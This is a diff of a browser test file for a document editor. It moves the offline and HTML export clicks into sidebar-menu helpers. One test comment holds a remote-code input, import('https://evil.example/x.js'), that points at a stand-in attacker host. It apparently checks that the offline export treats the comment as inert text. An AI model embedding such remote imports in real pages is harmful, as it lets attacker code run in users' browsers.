@@ -4,7 +4,8 @@ import fs from "fs";
 import path from "path";
 import {
   DEV, SKILL, PYTHON, fileUrl, ready, stageContent, startStaticServer,
-  installClipboardCapture, openToolbarMenu, addTextComment, readDownload, stageNonPortable,
+  installClipboardCapture, openToolbarMenu, openSidebarExportMenu, addTextComment, readDownload, stageNonPortable,
+  clickSidebarExport,
 } from "./helpers.js";
 
 const CONTENT = `
@@ -216,11 +217,13 @@ test("Export Offline embeds vendored mermaid and Chart.js for zero-network reope
     await expect(page.locator("#btnExportOfflineTop")).toBeVisible();
     await page.keyboard.press("Escape");
     await addTextComment(page, "#offline-note", "offline note with import('https://evil.example/x.js') survives");
+    await expect(page.locator("#btnSidebarExportMenu")).toBeVisible();
+    await openSidebarExportMenu(page);
     await expect(page.locator("#btnExportOffline")).toBeVisible();
 
     const [download] = await Promise.all([
       page.waitForEvent("download"),
-      page.locator("#btnExportOffline").click(),
+      clickSidebarExport(page, "#btnExportOffline"),
     ]);
     expect(download.suggestedFilename()).toMatch(/-offline\.html$/);
     const exportedHtml = await capturedDownloadText(page);
@@ -335,7 +338,7 @@ test("editing an already-offline document preserves offline mode and offline exp
 
     const [portableDownload] = await Promise.all([
       page.waitForEvent("download"),
-      page.locator("#btnSaveHtml").click(),
+      clickSidebarExport(page, "#btnSaveHtml"),
     ]);
     const portableHtml = await readDownload(portableDownload);
     expect(layerDescriptor(portableHtml).mode).toBe("offline");
@@ -346,7 +349,7 @@ test("editing an already-offline document preserves offline mode and offline exp
 
     const [offlineDownload] = await Promise.all([
       page.waitForEvent("download"),
-      page.locator("#btnExportOffline").click(),
+      clickSidebarExport(page, "#btnExportOffline"),
     ]);
     const offlineHtml = await readDownload(offlineDownload);
     expect(layerDescriptor(offlineHtml).mode).toBe("offline");
